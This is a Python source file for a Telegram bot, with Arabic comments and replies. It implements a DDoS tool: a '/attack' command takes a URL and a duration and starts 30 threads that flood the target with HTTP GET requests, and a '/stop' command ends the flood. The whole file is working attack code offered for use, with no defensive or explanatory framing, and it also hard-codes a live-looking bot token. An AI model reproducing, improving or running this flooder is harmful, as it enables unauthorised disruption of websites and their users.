import random
import time
import socket
import threading
import telebot
from urllib.parse import urlparse

# إعدادات أساسية
TOKEN = "7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU"
bot = telebot.TeleBot(TOKEN)

class SimpleDDoSTool:
    def __init__(self):
        self.active_attacks = {}
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10; SM-A505F)"
        ]

    def start_attack(self, chat_id, target, duration=60):
        """بدء هجوم بسيط"""
        try:
            # تحقق من صحة الرابط
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            parsed = urlparse(target)
            host = parsed.netloc
            port = 80  # افتراضي للHTTP
            
            if parsed.scheme == 'https':
                port = 443

            stop_event = threading.Event()
            threads = []

            def attack():
                while not stop_event.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((host, port))
                        
                        # بناء طلب بسيط
                        path = "/" + str(random.randint(1000, 9999))
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html',
                            'Connection': 'keep-alive'
                        }
                        
                        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                        for key, value in headers.items():
                            request += f"{key}: {value}\r\n"
                        request += "\r\n"
                        
                        s.send(request.encode())
                        time.sleep(0.5)
                        s.close()
                    except:
                        pass

            # بدء 30 خيط هجومي
            for _ in range(30):
                t = threading.Thread(target=attack)
                t.daemon = True
                t.start()
                threads.append(t)

            self.active_attacks[chat_id] = {
                'stop_event': stop_event,
                'threads': threads
            }

            # إيقاف الهجوم بعد المدة المحددة
            threading.Timer(duration, self.stop_attack, [chat_id]).start()
            
            return True, f"بدأ الهجوم على {target} لمدة {duration} ثانية"
        
        except Exception as e:
            return False, f"خطأ: {str(e)}"

    def stop_attack(self, chat_id):
        """إيقاف الهجوم"""
        if chat_id in self.active_attacks:
            self.active_attacks[chat_id]['stop_event'].set()
            for t in self.active_attacks[chat_id]['threads']:
                t.join()
            del self.active_attacks[chat_id]
            return True
        return False

# إنشاء الأداة
tool = SimpleDDoSTool()

# أوامر البوت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أوامر البوت:\n/attack [رابط] [وقت]\n/stop")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "استخدم: /attack [رابط] [وقت]")
            return
        
        target = parts[1]
        duration = int(parts[2]) if len(parts) > 2 else 60
        
        success, response = tool.start_attack(message.chat.id, target, duration)
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    if tool.stop_attack(message.chat.id):
        bot.reply_to(message, "تم إيقاف الهجوم")
    else:
        bot.reply_to(message, "لا يوجد هجوم نشط")

print("البوت يعمل...")
bot.polling()
